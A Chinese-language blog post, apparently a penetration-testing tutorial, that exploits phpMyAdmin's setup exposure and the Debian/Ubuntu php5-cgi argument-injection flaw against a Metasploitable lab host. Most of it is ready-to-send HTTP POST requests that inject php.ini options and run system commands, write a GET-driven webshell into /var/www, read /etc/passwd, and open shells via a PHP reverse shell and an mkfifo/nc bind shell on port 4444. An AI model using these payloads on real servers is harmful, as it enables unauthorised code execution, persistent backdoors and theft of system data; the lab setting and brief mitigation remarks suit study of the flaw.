    <content type="text"><![CDATA[phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。 以下版本受到影响：phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。 如果目标系统采用php语言搭建的环境,那么可以尝试使用一些扫描软件或者手动爬网去试图发现是否存在phpmyadmin目录. 测试环境:kali:192.168.128.128/24Metasploitable:192.168.128.129/24 1,存在phpmyadmin界面:如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件) 我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行 1234567891011121314151617POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码Host: 192.168.128.128 Content-Length: 35&lt;?php passthru(&apos;id&apos;); #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。 #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限die(); #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息?&gt; 可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果 命令如下: 123456789101112POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.128.128 Content-Length: 102&lt;?php passthru(&apos;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&apos;);#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令#反斜杠作用:避免服务器将上传内容过滤,输入命令无效die();?&gt; 通过在浏览器访问该木马,便可获取目标系统的shell 使用kali中的php脚本获取反弹shell 反弹shell:指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，那么我们就可以在本地使用被攻击主机的命令并且不容易被发现 kali中的PHP的反弹shell为:/usr/share/webshells/php/php-reverse-shell.php然后编辑php/php-reverse-shell.php,修改ip地址为本机kali的地址,端口号选1024-65535之内任意(1-1023端口已经被系统服务占用) 使用nc命令在本地(kali主机)监听本地1234端口然后将php-reverse-shell.php的内容粘贴至发送的POST请求中,点击go Ubuntu/Debain默认安装PHP5-CGI漏洞其针对Apache/PHP远程代码执行漏洞攻击该漏洞存在于使用PHP的Apache服务器，在Debian和Ubuntu的服务器上默认安装php5-cgi模块的服务器都存在此漏洞。程序员可以使用CGI模块在PHP代码中调用操作系统的命令如果安装了PHP5-CGI,则会在/usr/lib/cgi-bin下面生成两个二进制文件:php和php5我们发送编码后的参数信息(编码是为了防止服务器过滤信息)去获取目标服务器的shell 1234567891011121314POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 45&lt;?phpecho system(&apos;cat /etc/passwd&apos;);?&gt; 其实将刚刚编码的数据进行解码,可以看到其实就是PHP的参数数据 也可以让服务器主动打开一个端口,然后在本地使用nc去连接代码: 12345678910111213POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 86&lt;?phpecho system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
</search>
